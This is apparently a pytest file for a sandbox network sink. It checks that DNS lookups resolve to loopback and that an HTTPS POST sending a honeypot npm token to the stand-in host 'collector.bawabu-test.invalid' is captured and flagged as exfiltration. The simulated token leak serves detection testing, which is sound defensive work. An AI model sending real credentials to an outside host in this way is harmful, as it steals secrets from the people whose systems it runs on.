"""End-to-end test of the sink on localhost (ephemeral ports, no root): a DNS lookup resolves to
loopback and an HTTPS POST through the minted CA is captured with its body, so a leaked canary in
that body is caught by the evidence builder. This exercises the SNI cert minting for real."""

import json
import socket
import ssl
import struct
import time

from bawabu_sandbox import evidence, honeypots, sink


def _dns_query(name: str) -> bytes:
    header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    q = b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00"
    return header + q + struct.pack("!HH", 1, 1)


def test_sink_end_to_end(tmp_path):
    log, ca, ready = tmp_path / "sink.jsonl", tmp_path / "ca.pem", tmp_path / "ready"
    servers = sink.serve(str(log), str(ca), str(ready), 0, 0, 0)
    try:
        dns_port = servers[0].server_address[1]
        https_port = servers[2].server_address[1]
        for _ in range(100):
            if ready.exists():
                break
            time.sleep(0.02)
        assert ready.exists(), "sink never signalled ready"

        # DNS: a lookup resolves to loopback.
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp.settimeout(3)
        udp.sendto(_dns_query("collector.bawabu-test.invalid"), ("127.0.0.1", dns_port))
        resp, _ = udp.recvfrom(512)
        udp.close()
        assert socket.inet_ntoa(resp[-4:]) == "127.0.0.1"

        # HTTPS: POST a secret to a fake host; the sink terminates TLS with a cert it mints for the SNI name.
        ctx = ssl.create_default_context(cafile=str(ca))
        raw = socket.create_connection(("127.0.0.1", https_port), timeout=3)
        tls = ctx.wrap_socket(raw, server_hostname="collector.bawabu-test.invalid")
        body = b"payload=" + honeypots.NPM_TOKEN.encode()
        tls.sendall(
            b"POST /collect HTTP/1.1\r\nHost: collector.bawabu-test.invalid\r\n"
            b"Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body) + body
        )
        tls.recv(4096)
        tls.close()
        time.sleep(0.3)

        events = [json.loads(line) for line in log.read_text().splitlines()]
        kinds = {e["kind"] for e in events}
        assert "dns" in kinds and "http" in kinds
        http = next(e for e in events if e["kind"] == "http")
        assert http["scheme"] == "https" and http["method"] == "POST"
        assert http["host"] == "collector.bawabu-test.invalid"

        ev = evidence.build("", events, duration_s=1.0)
        assert ev.exfiltration
        assert any("npm token" in c for c in ev.canaries_leaked)
    finally:
        for srv in servers:
            srv.shutdown()
